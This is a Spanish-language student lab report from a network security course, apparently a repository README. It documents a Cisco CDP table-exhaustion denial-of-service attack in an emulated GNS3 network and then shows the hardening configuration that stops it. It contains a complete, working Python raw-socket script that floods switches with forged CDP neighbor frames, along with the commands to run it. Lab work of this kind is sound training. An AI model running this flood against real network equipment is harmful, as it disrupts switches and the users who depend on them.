---

# 🛡️ Security Audit: Cisco Discovery Protocol (CDP) Manipulation & DoS

---
<p align="center">
  <img src="https://img.shields.io/badge/Platform-GNS3-blue?style=for-the-badge&logo=virtualbox&logoColor=white" alt="GNS3 Platform">
  <img src="https://img.shields.io/badge/Language-Python%203-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python 3">
  <img src="https://img.shields.io/badge/Library-Scapy-red?style=for-the-badge&logo=scapy&logoColor=white" alt="Scapy">
  <img src="https://img.shields.io/badge/Status-Mitigated-success?style=for-the-badge" alt="Status Mitigated">
</p>


## 📝 Información del Estudiante

* **Institución:** Instituto Tecnológico de Las Américas (ITLA)
* **Asignatura:** Seguridad de Redes
* **Auditor Técnico:** Zoe Daniela Bobonagua Acevedo
* **Matrícula:** 2025-0839
* **Evidencia Audiovisual:** [▶️ Video aqui ](https://youtu.be/cduEUtTLYSY?si=6tDZVadBdQ14XCzJ)

---

## 🎯 1. Objetivo del Laboratorio

El propósito fundamental de esta auditoría es evaluar el comportamiento operativo de las tablas de adyacencia de Cisco Discovery Protocol (**CDP**) ante ataques de inundación de estados de enlace de Capa 2. La práctica demuestra cómo la inyección descontrolada de falsas identidades de hardware satura la memoria RAM y degrada los recursos de procesamiento (CPU) del switch (*Table Exhaustion DoS*). De igual manera, se valida la correcta implementación de directivas de desactivación selectiva del protocolo como mecanismo defensivo estándar.

---

## 📐 2. Arquitectura de la Red Emulada

La infraestructura física y lógica fue replicada en **GNS3** operando bajo el segmento IP corporativo `10.25.83.0/24`.

### Diagrama de Flujo Lógico

```text
                      +-----------------------+
                      |    R1 (Cisco IOSv)    |
                      |   Gateway & DHCP Srv  |
                      +-----------------------+
                                  | f0/0
                                  |
                                  | Gi0/1
                      +-----------------------+
                      |  SW1 (Cisco IOSv-L2)  |
                      |   Core / STP Root     |
                      +-----------------------+
                                  | Gi0/2
                                  |
                                  | Gi0/2
                      +-----------------------+
                      |  SW2 (Cisco IOSv-L2)  |
                      |     Access Switch     |
                      +-----------------------+
                         | Gi0/3           | Gi1/0
                         |                 |
                         | e0              | e0
          +--------------------+     +--------------------+
          |    kali-1 (VM)     |     |     PC1 (VPCS)     |
          |  Auditor Estático  |     |   Cliente Dinámico |
          +--------------------+     +--------------------+

```

### Cuadro de Direccionamiento e Interfaces

| Dispositivo | Interfaz Física | Tipo de Enlace | Dirección IP | Máscara de Red | Default Gateway | Segmento VLAN |
| --- | --- | --- | --- | --- | --- | --- |
| **R1** | f0/0.83 | Subinterfaz | 10.25.83.1 | 255.255.255.0 | N/A | VLAN 83 (Data) |
| **R1** | f0/0.99 | Subinterfaz | 10.25.99.1 | 255.255.255.0 | N/A | VLAN 99 (Nativa) |
| **SW1** | Vlan99 | Virtual SVI | 10.25.99.11 | 255.255.255.0 | 10.25.99.1 | VLAN 99 (Gestión) |
| **SW2** | Vlan99 | Virtual SVI | 10.25.99.12 | 255.255.255.0 | 10.25.99.1 | VLAN 99 (Gestión) |
| **kali-1** | eth0 | Acceso Estático | 10.25.83.12 | 255.255.255.0 | 10.25.83.1 | VLAN 83 (Data) |
| **PC1** | e0 | Acceso Dinámico | Asignada DHCP | 255.255.255.0 | 10.25.83.1 | VLAN 83 (Data) |

---

## 💻 3. Documentación Técnica del Script (`cdp_dos.py`)

### Análisis Operativo del Código

A diferencia de herramientas convencionales, este script interactúa directamente con el kernel del sistema operativo mediante un socket crudo (`socket.SOCK_RAW`). Esto optimiza los tiempos de procesamiento al omitir librerías externas. La herramienta opera de la siguiente manera:

1. **Encapsulación LLC/SNAP:** Construye las cabeceras requeridas para protocolos propietarios de Cisco (`0x42 0x42 0x03...`).
2. **Estructura TLV (Type-Length-Value):** Empaqueta dinámicamente campos de tipo, longitud y valor para simular atributos legítimos del sistema operativo IOS, tales como la plataforma, la versión del software y el ID del dispositivo.
3. **Inundación Mutante:** Modifica e incrementa de forma matemática un contador (`counter`) en cada iteración para variar el nombre del `Device ID`. Al ser tramas multicast destinadas a la dirección oficial de CDP (`01:00:0c:cc:cc:cc`), el switch se ve obligado a alojar miles de vecinos inexistentes en su memoria RAM de forma concurrente.

### Código de la Herramienta

```python
#!/usr/bin/env python3
import socket
import sys
import time
import random

interface = "eth0"
print(f"[*] Lanzando ataque CDP DoS de alta compatibilidad en {interface}...")
print("[*] Presiona Ctrl+C para detener el ataque.\n")

# 1. Obtener la dirección MAC real de la interfaz eth0
try:
    with open(f"/sys/class/net/{interface}/address", "r") as f:
        real_mac_str = f.read().strip()
    real_mac = bytes.fromhex(real_mac_str.replace(":", ""))
    print(f"[+] MAC Real detectada: {real_mac_str}")
except Exception as e:
    print(f"[-] Error al obtener la MAC de la interfaz {interface}: {e}")
    sys.exit(1)

# 2. Configurar el Socket Crudo (Raw Socket) a nivel de Kernel
try:
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((interface, 0))
except PermissionError:
    print("[-] Error: Debes ejecutar este script con 'sudo'.")
    sys.exit(1)
except Exception as e:
    print(f"[-] Error al abrir el socket: {e}")
    sys.exit(1)

# Dirección MAC Multicast destino oficial de CDP
cdp_multicast = b"\x01\x00\x0c\xcc\xcc\xcc"

# Cabeceras estáticas requeridas por Cisco (LLC + SNAP)
llc_snap = b"\x42\x42\x03\x00\x00\x0c\x20\x00"

# Función matemática para calcular el Checksum estándar de Internet (RFC 1071)
def calculate_checksum(data):
    if len(data) % 2 == 1:
        data += b"\x00"
    s = sum(int.from_bytes(data[i:i+2], "big") for i in range(0, len(data), 2))
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff

counter = 0
try:
    while True:
        counter += 1
        
        # Datos del falso vecino (Cambiamos el ID en cada ronda para saturar el Switch)
        device_id = f"Falso_Router_{counter}".encode('utf-8')
        platform = b"cisco 3725"
        software = b"Cisco IOS Software, Version 15.1"
        
        # Construcción de los bloques TLV (Type-Length-Value)
        # Device ID (Type 0x0001)
        tlv_device = b"\x00\x01" + int.to_bytes(len(device_id) + 4, 2, "big") + device_id
        # Software Version (Type 0x0002)
        tlv_software = b"\x00\x02" + int.to_bytes(len(software) + 4, 2, "big") + software
        # Platform (Type 0x0006)
        tlv_platform = b"\x00\x06" + int.to_bytes(len(platform) + 4, 2, "big") + platform
        
        all_tlvs = tlv_device + tlv_software + tlv_platform
        
        # Cabecera base de CDP: Versión 2, TTL 180s, Checksum temporal en 0x0000
        cdp_base = b"\x02\xb4\x00\x00"
        
        # Calcular el Checksum real sobre el contenido de CDP
        chk = calculate_checksum(cdp_base + all_tlvs)
        cdp_base_with_chk = b"\x02\xb4" + int.to_bytes(chk, 2, "big")
        
        # Ensamblar el paquete completo desde Capa 2
        # Ethernet (MAC Destino + MAC Origen) + LLC/SNAP + CDP
        packet = cdp_multicast + real_mac + llc_snap + cdp_base_with_chk + all_tlvs
        
        # Forzar relleno mínimo de trama Ethernet (60 bytes sin contar el CRC)
        if len(packet) < 60:
            packet += b"\x00" * (60 - len(packet))
            
        # Enviar el paquete directamente al cable físico
        s.send(packet)
        
        # Un pequeño respiro de 0.001s para no colapsar la CPU de tu propia máquina virtual
        time.sleep(0.001)

except KeyboardInterrupt:
    print("\n[!] Ataque detenido por el usuario.")
    s.close()
    sys.exit(0)

```

---

## 🚀 4. Guía de Ejecución y Diagnóstico de Anomalías

### Paso 1: Comprobar el Estado de Vecindad Original

Verifique que el conmutador de acceso (**SW2**) únicamente cuente con conexiones legítimas mapeadas (por ejemplo, los enlaces troncales hacia el Core SW1):

```text
SW2# show cdp neighbors

```

### Paso 2: Lanzamiento del Ataque de Inundación (Flooding)

Ejecute el script en la máquina Kali Linux con elevación de privilegios para permitir la apertura de sockets a nivel de hardware:

```bash
chmod +x cdp_dos.py
sudo ./cdp_dos.py

```

### Paso 3: Monitoreo de Impacto en Recursos

Regrese de inmediato al Switch de Acceso **SW2** y consulte la tabla de vecinos. Observará miles de entradas falsas listadas por la interfaz `GigabitEthernet0/3`:

```text
SW2# show cdp neighbors
SW2# show memory statistics

```

> **Nota de Diagnóstico:** La persistencia del ataque provocará un aumento crítico en el uso de memoria asignada a los procesos del sistema de Cisco IOS, afectando la estabilidad general del dispositivo.

---

## 🛠️ 5. Plan de Mitigación e Ingeniería de Hardening

> [!IMPORTANT]
> El protocolo CDP envía información sensible de la topología en texto plano y no incluye autenticación. Como política de seguridad estándar (*Hardening Rule*), CDP debe desactivarse por completo en todos los puertos de acceso perimetrales orientados a usuarios finales o terminales no administrativas.

### Configuración Defensiva (Copiar y pegar en SW2)

Para neutralizar la vulnerabilidad manteniendo el descubrimiento activo exclusivamente en enlaces troncales e infraestructuras de confianza, aplique el siguiente procedimiento en **SW2**:

```text
configure terminal
!
! Opción A: Desactivación selectiva (Recomendada en los accesos de usuario)
interface range GigabitEthernet0/3 , GigabitEthernet1/0
 description DEFENSE_CDP_ACCESS_PORTS
 no cdp enable
exit
!
! Opción B: Desactivación Global (Si no se requiere el protocolo en el Switch)
! no cdp run
end

```

### Comprobación de la Eficiencia de la Defensa

Una vez aplicados los comandos defensivos, reinicie la ejecución del script desde la terminal de Kali Linux. Verifique el estado en **SW2**:

```text
SW2# clear cdp table
SW2# show cdp neighbors

```

El conmutador ignorará de manera inmediata todas las tramas multicast de procesamiento CDP entrantes por la interfaz `Gi0/3`. La tabla de adyacencia permanecerá limpia y los recursos de memoria y CPU del hardware estarán completamente protegidos.

---

## ⚖️ 6. Aviso de Uso Académico

Este repositorio se ha estructurado bajo estrictos fines educativos y de investigación para cumplir con la Práctica del laboratorio de **Seguridad de Redes** en el **ITLA**. El uso de técnicas de denegación de servicio fuera de infraestructuras controladas de laboratorio no está autorizado y se encuentra sujeto a sanciones bajo las normativas legales locales correspondientes.
